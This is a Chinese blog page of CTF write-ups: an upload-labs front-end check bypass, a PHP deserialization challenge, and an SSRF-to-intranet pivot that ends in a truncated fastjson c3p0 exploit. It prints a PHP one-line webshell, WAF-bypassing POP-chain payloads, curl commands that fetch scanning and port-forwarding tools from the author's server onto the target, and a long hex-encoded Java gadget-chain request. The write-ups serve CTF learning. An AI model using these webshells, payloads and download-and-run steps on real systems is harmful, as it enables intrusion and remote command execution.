-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>lastIndexOf(“.”)函数的作用是“获取程序后缀”</p>
-<p>虽然给了代码，但是光看这些代码还是不够的，必须要结合html看才行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3&gt;上传区&lt;&#x2F;h3&gt;</span><br><span class="line">            &lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">                &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt;</span><br><span class="line">                &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot;&#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
-<p>在HTML中，我们看见checkFile()函数主要影响的是post时的onsubmit，相当于只有通过check才会构建post包进行上传。<br>这就是俗称的“前端检测”<br>个人认为，一般来说“前后端检测”的差别定义为“前端脚本（html，js）”和“后端脚本（php）”的区别，感觉也可以以构建数据包为分界，构建前检测的是“前端”，构建后检测的为“后端”。</p>
-<p>既然这是一个前端脚本，那我们的目的只是绕过构筑数据包之前的部分。<br>所以先写一个一句话木马：<code>&lt;?php @system($_POST[&#39;a&#39;]);?&gt;</code><br>然后把文件的后缀改为png<br>上传以后通过burpsuite抓包，将后缀改成php发送</p>
-
-<p>用蚁剑连接成功</p>
-
-
-<p>当然，这既然是前端脚本，而且是js，那就直接“禁用js”就行了</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/09/25/uploadlabs-1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-hellouser" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/25/hellouser/">DASCTF秋季挑战赛_hellouser</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/09/25/hellouser/" class="archive-article-date">
-  	<time datetime="2021-09-25T08:38:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>本来这段时间太忙没有报ctf比赛的，今天在返校的火车上突然收到安恒的邀请短信，就登录打着玩玩了。</p>
-<p>打开后是php代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function show()&#123;</span><br><span class="line">        echo $this-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $arg;</span><br><span class="line">    </span><br><span class="line">    public function show()&#123;</span><br><span class="line">        $func &#x3D; $this-&gt;func;</span><br><span class="line">        if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $this-&gt;func) || preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log&#x2F;i&#39;, $this-&gt;arg)) &#123; </span><br><span class="line">            die(&#39;No!No!No!&#39;); </span><br><span class="line">        &#125; else &#123; </span><br><span class="line">            include &quot;flag.php&quot;;</span><br><span class="line">            &#x2F;&#x2F;There is no code to print flag in flag.php</span><br><span class="line">            $func(&#39;&#39;, $this-&gt;arg); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;show();</span><br><span class="line">        return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;pop&#39;]))&#123;</span><br><span class="line">    $aaa &#x3D; unserialize($_GET[&#39;pop&#39;]);</span><br><span class="line">    $aaa();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>很明显，需要序列化A然后在A中实体化B，进一步序列化B，达到“序列套序列”的效果。<br>可是直接写<code>val=new B();</code>是不行的。<br>没思路之下想到这是套神出的题，所以就在ctfshow的wp里找了一下，果然发现了方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $class;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class&#x3D;new backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code&#x3D;&#39;system(&quot;cat f*&quot;);&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$b&#x3D;new ctfShowUser();</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>
-
-<p>可以通过<code>__construct()</code>魔法函数实体化别的类。<br>所以第一步的payload为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">    $this-&gt;var &#x3D;new B();</span><br><span class="line">&#125;</span><br><span class="line">	public $var&#x3D;&quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$bbb &#x3D; new A; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo $bbb&#x3D;serialize($bbb);</span><br></pre></td></tr></table></figure>
-
-<p>之后就是给$func和$arg赋值，构造可执行函数了<br>这里可以直接参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaolong22333/article/details/115332682">https://blog.csdn.net/xiaolong22333/article/details/115332682</a><br>绕waf可以用get_defined_vars()函数，所以第二个payload为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">    $this-&gt;var &#x3D;new B();</span><br><span class="line">&#125;</span><br><span class="line">    public $var&#x3D;&quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $func&#x3D;&quot;create_function&quot;;</span><br><span class="line">    public $arg&#x3D;&quot;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$bbb &#x3D; new A; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo $bbb&#x3D;serialize($bbb);</span><br></pre></td></tr></table></figure>
-<p>获得真正的flag文件名（不愧是套神）</p>
-<img src="/2021/09/25/hellouser/1.PNG" class="" title="1.PNG">
-
-<p>然后可以用require代替被waf的include，用base64绕过flag的waf（<code>VHJ1M2ZsYWcucGhw</code>）<br>所以最后的payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">    $this-&gt;var &#x3D;new B();</span><br><span class="line">&#125;</span><br><span class="line">	public $var&#x3D;&quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $func&#x3D;&quot;create_function&quot;;</span><br><span class="line">    public $arg&#x3D;&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$bbb &#x3D; new A; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo $bbb&#x3D;serialize($bbb);</span><br></pre></td></tr></table></figure>
-<p>得到真正的flag</p>
-<img src="/2021/09/25/hellouser/1.PNG" class="" title="1.PNG">
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/09/25/hellouser/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-祥云杯2021-层层穿透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-%E5%B1%82%E5%B1%82%E7%A9%BF%E9%80%8F/">祥云杯2021_层层穿透</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-%E5%B1%82%E5%B1%82%E7%A9%BF%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2021-08-26T09:23:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打不开环境+公共环境被卡死+主办方直接在开始放题的时候就公开了源码附件+百度的第一二条就是题解=&gt;直接撂挑子不干了（不过还是学了不少东西）</p>
-<p>这道题是ssrf<br>前半部分和——<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45492773/article/details/105975768">https://blog.csdn.net/weixin_45492773/article/details/105975768</a><br>一模一样</p>
-<p>直到拿到shell都完全没有什么不同</p>
-<p>拿到shell后，还要再实现一次内网穿透，这里学到了一个新姿势——<br>虽然没有写的权限，但是可以进行下载，所以可以把一些需要用的软件放在自己的服务器上，然后远程操纵环境进行curl，把他、软件下过去后赋予权限，再进行之后的操作。</p>
-<p>1.下载fscan（ <a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a> ）进行扫描<br>进入tmp目录，使用curl下载自己服务器的fscan<br><code>curl http://ip/fscan_amd64 &gt;&gt; fscan_amd64</code></p>
-<p>然后赋予权限<br><code>chmod 777 fscan_amd64</code></p>
-<p>然后进行扫描<br><code>./fscan_amd64 -h 10.10.1.1/24</code></p>
-<p>最后发现内网 10.10.1.11 存在Shiro SprintBoot</p>
-<p>2.同样方法下载portmap( <a target="_blank" rel="noopener" href="http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip">http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip</a> ）</p>
-<p><code>curl http://ip/portmap &gt;&gt; portmap</code></p>
-<p><code>chmod 777 portmap</code></p>
-<p>然后在自己服务器上运行，就是将5567端口的数据转发至8005端口<br><code>./portmap -m 2 -p1 5567 -p2 8005</code></p>
-<p>然后再在靶机上运行，将内网环境转发出来<br><code>./portmap -m 3 -h1 ip -p1 5567 -h2 10.10.1.11 -p2 8080</code><br>然后就可以在公网访问了</p>
-<p>题目提供了源码，下载下来，使用jd-gui反编译查看一下<br>账号密码为 admin / 123456<br>还发现了fastjson，但是有waf，需要绕过<br>然后再lib里发现了 hibernate-c3p0-5.3.14.Final.jar<br>在githun上面找到了绕过方式，c3p0反序列化（ <a target="_blank" rel="noopener" href="https://github.com/depycode/fastjson-c3p0">https://github.com/depycode/fastjson-c3p0</a> ）<br>要想反序列化需要想登陆获取cookie，所以先登录<br>获取到cookie后bp抓包，修改数据包，直接将利用链复制粘贴，然后直接粘贴的话就会回显太短<br>因为对传入的长度进行了判断<br>所以直接就再填充2w的数据即可，最后的payload如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;test HTTP&#x2F;1.1</span><br><span class="line">Host: 81.70.105.149:8005</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.142 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">cmd: cat &#x2F;flag</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 28963</span><br><span class="line">Cookie: d0c13ba04d29a2c666096db3206682c8&#x3D;6f2998af-b14a-4ebc-9002-eea46873c544.KgKniEGW1GMEX6nqT4eQLtFMsXQ; request_token&#x3D;8c7wo37zB5OkLDIpgnqfuht93rbWqTEjsLvir0wS0soYk8XE; pro_end&#x3D;-1; ltd_end&#x3D;-1; serverType&#x3D;apache; order&#x3D;id%20desc; memSize&#x3D;1838; bt_user_info&#x3D;%7B%22status%22%3Atrue%2C%22msg%22%3A%22%u83B7%u53D6%u6210%u529F%21%22%2C%22data%22%3A%7B%22username%22%3A%22158****9824%22%7D%7D; rank&#x3D;list; Path&#x3D;&#x2F;www&#x2F;wwwroot&#x2F;myweb; file_recycle_status&#x3D;true; JSESSIONID&#x3D;4A2824342782C0A7393AF8ACF226F26B</span><br><span class="line"></span><br><span class="line">&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;&quot;&#125;,</span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        